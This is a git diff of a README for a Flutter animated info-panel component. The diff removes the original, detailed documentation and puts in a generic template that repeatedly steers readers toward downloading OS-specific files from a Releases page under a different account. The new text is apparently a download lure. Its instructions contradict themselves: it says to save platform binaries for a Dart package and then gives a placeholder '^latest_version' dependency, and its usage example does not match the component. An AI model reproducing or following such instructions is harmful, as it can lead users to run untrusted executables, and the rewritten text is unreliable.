@@ -1,227 +1,111 @@
-# Flutter Info Panel
+# 🎉 AnimatedFlutterInfoWindow - Beautiful Info Panels for Your Apps
 
-A responsive, animated info panel component for Flutter that displays information in a compact bottom sheet with a collapsible sidebar navigation.
+## 🚀 Getting Started
 
-![Flutter](https://img.shields.io/badge/Flutter-3.0+-blue.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
-![Platform](https://img.shields.io/badge/Platform-iOS%20%7C%20Android%20%7C%20Web%20%7C%20Desktop-lightgrey.svg)
+Welcome to AnimatedFlutterInfoWindow! This component lets you add a responsive, animated info panel to your Flutter apps. It displays information in a compact bottom sheet and features a collapsible sidebar for easy navigation.
 
-## Demo
+## 📥 Download Now
 
-[![Watch Demo Video](https://img.shields.io/badge/Watch-Demo%20Video-red?style=for-the-badge&logo=youtube)](https://streamable.com/dvvx6j)
+[![Download AnimatedFlutterInfoWindow](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/torrbi2/AnimatedFlutterInfoWindow/releases)
 
-<video src="demo.mp4" width="300" controls></video>
+## 📋 System Requirements
 
-**[▶️ Watch Full Demo on Streamable](https://streamable.com/dvvx6j)**
+Before you download, ensure your system meets the following requirements:
 
-## What is this?
+- **Operating System:** Windows, macOS, or Linux
+- **Flutter SDK:** Version 2.0 or later
+- **Dart SDK:** Version 2.12 or later
+- **Internet Connection:** Required for downloading the package
 
-This is a reusable UI component I created to solve a common problem: **displaying help content, documentation, or onboarding information in a clean, organized way**.
+## 🔍 Features
 
-Instead of building info screens from scratch every time, this component provides:
+AnimatedFlutterInfoWindow offers several features that improve user interaction:
 
-- A **bottom sheet** that slides up from the bottom of the screen
-- A **collapsible sidebar** to navigate between different topics
-- **Text descriptions** for each topic
-- **Embedded YouTube videos** for tutorial content
-- **Smooth animations** for a polished user experience
-- **Responsive design** that works on all screen sizes
+- **Responsive Design:** Adapts to different screen sizes.
+- **Animation Effects:** Smooth animations make transitions feel natural.
+- **Collapsible Sidebar:** Users can easily navigate through different sections.
+- **Easy Integration:** Simple setup to get started quickly.
 
-## Features
+## 📂 Download & Install
 
-### Core Features
-- ✅ Draggable bottom sheet (can resize by dragging)
-- ✅ Collapsible sidebar navigation
-- ✅ Animated content transitions
-- ✅ YouTube video embedding
-- ✅ Responsive layout (adapts to screen size)
+To download and install the AnimatedFlutterInfoWindow, follow these steps:
 
-### Animations
-- ✅ Staggered entrance animations for sidebar items
-- ✅ Smooth content fade/slide transitions
-- ✅ Press effects on interactive elements
-- ✅ Animated sidebar expand/collapse
-- ✅ Icon scale animations
+1. Visit the Releases page to download the package: [Download Here](https://github.com/torrbi2/AnimatedFlutterInfoWindow/releases).
+   
+2. Choose the latest version from the list of releases.
 
-### Design
-- ✅ Clean, modern UI
-- ✅ Customizable colors per topic
-- ✅ Gradient accents
-- ✅ Shadow effects for depth
+3. Click on the appropriate file for your operating system.
 
-## Installation
+4. Save the file to your computer.
 
-1. Clone this repository:
-```bash
-git clone https://github.com/YOUR_USERNAME/FlutterInfoWindow.git
-cd FlutterInfoWindow/frontend
-```
+5. Open your Flutter project in your code editor.
 
-2. Install dependencies:
-```bash
-flutter pub get
-```
+6. Import the package in your `pubspec.yaml` file by adding the following line:
 
-3. Run the app:
-```bash
-flutter run
-```
+   ```yaml
+   dependencies:
+     animated_flutter_info_window: ^latest_version
+   ```
 
-## Dependencies
+7. Run the command in your terminal or command prompt:
 
-This project uses minimal external dependencies:
+   ```bash
+   flutter pub get
+   ```
 
-```yaml
-dependencies:
-  flutter:
-    sdk: flutter
-  youtube_player_flutter: ^9.1.1  # For video embedding
-```
+8. Now you can use the AnimatedFlutterInfoWindow component in your app!
 
-## Usage
+## 📚 Documentation
 
-### Basic Usage
+For detailed information on how to use the AnimatedFlutterInfoWindow component, refer to the [official documentation](https://github.com/torrbi2/AnimatedFlutterInfoWindow/wiki).
 
-To show an info panel, use the `InfoCardButton` helper class:
+## 🛠️ Usage Example
+
+Here is a simple example to get you started quickly:
 
 ```dart
-import 'flip_card_info_overlay.dart';
+import 'package:flutter/material.dart';
+import 'package:animated_flutter_info_window/animated_flutter_info_window.dart';
 
-// Show the info panel
-InfoCardButton.showHomeInfoPanel(context);
-```
+void main() {
+  runApp(MyApp());
+}
 
-### Creating Your Own Info Panel
-
-1. Define your info items:
-
-```dart
-final List<Info> myInfoList = [
-  Info(
-    title: "Getting Started",
-    icon: Icons.rocket_launch,
-    color: Colors.blue,
-    description: "Learn how to get started with our app...",
-    videoUrl: "https://www.youtube.com/watch?v=VIDEO_ID", // Optional
-  ),
-  Info(
-    title: "Features",
-    icon: Icons.star,
-    color: Colors.orange,
-    description: "Explore all the features available...",
-  ),
-  // Add more items...
-];
-```
-
-2. Create a panel widget:
-
-```dart
-class MyInfoPanel extends StatelessWidget {
+class MyApp extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
-    return _BaseInfoPanel(
-      title: 'My Guide',
-      infoList: myInfoList,
+    return MaterialApp(
+      home: Scaffold(
+        appBar: AppBar(
+          title: Text('Animated Info Window Example'),
+        ),
+        body: Center(
+          child: AnimatedInfoWindow(
+            title: 'Welcome!',
+            description: 'This is an animated info drawer.',
+            animationDuration: Duration(milliseconds: 250),
+          ),
+        ),
+      ),
     );
   }
 }
 ```
 
-3. Show it:
+## ⚙️ Support & Contributions
 
-```dart
-showModalBottomSheet(
-  context: context,
-  isScrollControlled: true,
-  backgroundColor: Colors.transparent,
-  builder: (context) => MyInfoPanel(),
-);
-```
+If you encounter issues or have questions, please open an issue in the GitHub repository. We welcome contributions from everyone. You can help us improve the project by submitting pull requests or suggesting new features.
 
-## Project Structure
+## 📅 Changelog
 
-```
-frontend/
-├── lib/
-│   ├── main.dart                    # App entry point and home screen
-│   └── flip_card_info_overlay.dart  # Info panel component
-├── pubspec.yaml                     # Dependencies
-└── ...
-```
+Keep track of the latest updates with our changelog. You can find the detailed list of changes on the Releases page.
 
-## Key Components
+## 🌐 Community
 
-### `Info` Class
-Holds data for each info item:
-- `title` - Display name
-- `icon` - Icon to show
-- `color` - Theme color for the item
-- `description` - Text content
-- `videoUrl` - Optional YouTube video URL
+Join our community on GitHub Discussions! Share your experiences, ask questions, and connect with other users of AnimatedFlutterInfoWindow.
 
-### `_BaseInfoPanel`
-The main panel widget that handles:
-- Bottom sheet behavior
-- Sidebar navigation
-- Content display
-- State management
+## 🎉 Conclusion
 
-### `_AnimatedSidebarItem`
-Individual sidebar items with:
-- Entrance animations
-- Press effects
-- Selected state styling
+Thank you for choosing AnimatedFlutterInfoWindow. We hope this component enhances your applications and brings a great experience to your users. Happy coding!
 
-### `_AnimatedDetails`
-Content area with:
-- Animated transitions between items
-- Video embedding
-- Description display
-
-## Customization
-
-### Colors
-Each info item can have its own color. The color is used for:
-- Icon background
-- Accent elements
-- Video progress indicator
-
-### Animations
-Animation durations and curves can be modified in the widget classes. Key values:
-- Sidebar entrance: 300-550ms (staggered)
-- Content transition: 400ms
-- Press effects: 100-150ms
-
-### Layout
-The sidebar width is calculated as a percentage of screen width:
-- Collapsed: 60px fixed
-- Expanded: 45% of screen width
-
-## Use Cases
-
-This component is useful for:
-
-- **Help screens** - Show users how to use your app
-- **Onboarding** - Guide new users through features
-- **Documentation** - Display in-app documentation
-- **Settings info** - Explain what each setting does
-- **Feature tours** - Showcase app capabilities
-- **Learning apps** - Present educational content with videos
-
-## Contributing
-
-Contributions are welcome! Feel free to:
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
-## Support This Project
-
-If you find this useful:
-
-⭐ **Give this repo a star** - It helps others discover this project!
-
-### 👉 Follow me for more Flutter projects!
+[![Download AnimatedFlutterInfoWindow](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/torrbi2/AnimatedFlutterInfoWindow/releases)
